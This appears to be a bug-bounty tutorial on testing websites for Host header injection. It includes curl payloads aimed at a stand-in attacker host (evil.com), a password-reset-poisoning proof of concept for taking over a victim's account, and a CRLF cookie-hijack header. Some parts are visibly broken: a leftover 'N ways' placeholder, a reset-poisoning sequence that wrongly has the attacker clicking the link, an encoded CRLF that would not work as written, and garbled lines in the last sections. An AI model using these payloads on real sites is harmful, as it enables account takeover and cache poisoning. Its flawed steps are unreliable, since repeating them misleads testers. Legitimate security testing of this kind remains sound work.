# HOW TO TEST HOST HEADER INJECTION ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N ways to test
1. Host override: send any Host and see if the app trusts it (routing, redirect construction, links).
2. Absolute URL in request line: GET https://target.com/ HTTP/1.1 + Host: evil.com.
3. Duplicate Host headers (both kept): proxy passes last, app reads first (or vice versa).
4. Header variants: X-Forwarded-Host, X-Forwarded-Server, X-Host, X-Rewrite-URL, Forwarded.
5. Conflicting Host + XFH: two signals, app prefers one -> if it prefers attacker value, bug.
6. Newline in Host: sends into Location (CRLF injection).
7. Password reset poisoning: app builds reset link from Host -> attacker gets victim's token.
8. Cache poisoning: response cached under attacker Host, other users served it.
9. Routing to internal host: Host: internal.admin -> SSRF-ish request routings.

## Step-by-step on target
1. In a normal GET, replace Host: `evil.com` and Inspect: Location, redirect URL, `<link>`, form actions.
2. Add X-Forwarded-Host: evil.com instead; compare.
3. Send two Host headers in one request (Burp writes both) - see which is honored.
4. Watch password-reset flow: request reset for victim, if email link shows evil.com domain + the
   reset token -> full account takeover (report High/Critical).
5. Cache poisoning: repeat GET with Host: evil.com; if the page anywhere echoes or is cached -> huge.

## Worked examples (concrete)
```
curl -i -H "Host: evil.com" "https://target.com/"                      # #1
curl -i "https://target.com/" -H "Host: evil.com" -H "Host: target.com"   # #3 dup
curl -i -H "X-Forwarded-Host: evil.com" "https://target.com/login"
curl -i -H "X-Forwarded-Server: evil.com" "https://target.com/"
curl -i -H "Forwarded: for=evil.com;host=evil.com" "https://target.com/"
curl -i -H "Host: target.com" -H "X-Original-URL: /admin" "https://target.com/"
Password reset poisoning PoC:
1) POST /forgot  Host: evil.com  body: email=victim@x.com
2) victim's reset email contains  https://evil.com/reset?token=...
3) attacker clicks it first -> sets new password (account takeover)
curl -X POST "https://target.com/forgot" -H "Host: evil.com" -d "email=victim@x.com"
CRLF in Host:
curl -i -H "Host: target.com%0d%0aSet-Cookie: session=hijacked" "https://target.com/"
```

## False positives
- App builds absolute URLs with its CONFIG, not your header -> not a bug.
- Host trusts only exact list and 400s on garbage -> safe.
- XFH honored only for proxied traffic guard -> test from the PUBLIC edge, is that a bypass anyway?

## Reporting
- Support reset-token steal = Critical/High. Link/redirect poisoning without token = Low/Medium.
- Cache-host poisoning = High if you demo other users receiving your Host.
